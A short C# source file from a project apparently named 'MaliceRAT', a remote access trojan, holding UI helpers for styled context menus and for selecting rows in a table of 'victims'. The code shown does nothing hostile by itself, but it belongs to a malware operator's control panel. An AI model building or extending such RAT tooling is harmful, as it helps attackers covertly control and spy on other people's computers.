using System;
using System.Drawing;
using System.Windows.Forms;

namespace MaliceRAT
{
    public static class ContextMenuUtilities
    {
        public static ToolStripMenuItem CreateContextMenuItem(string text, EventHandler onClick)
        {
            ToolStripMenuItem menuItem = new ToolStripMenuItem(text);
            menuItem.BackColor = Color.FromArgb(23, 23, 24);
            menuItem.ForeColor = Color.FromArgb(255, 255, 255);
            menuItem.TextAlign = ContentAlignment.MiddleLeft;
            menuItem.Click += onClick;

            return menuItem;
        }
        public static void GunaVictimsTable_MouseDown(object sender, MouseEventArgs e, DataGridView gunaVictimsTable)
        {
            if (e.Button == MouseButtons.Right)
            {
                var hti = gunaVictimsTable.HitTest(e.X, e.Y);
                gunaVictimsTable.ClearSelection();
                if (hti.RowIndex != -1)
                {
                    gunaVictimsTable.Rows[hti.RowIndex].Selected = true;
                }
            }
        }
    }
}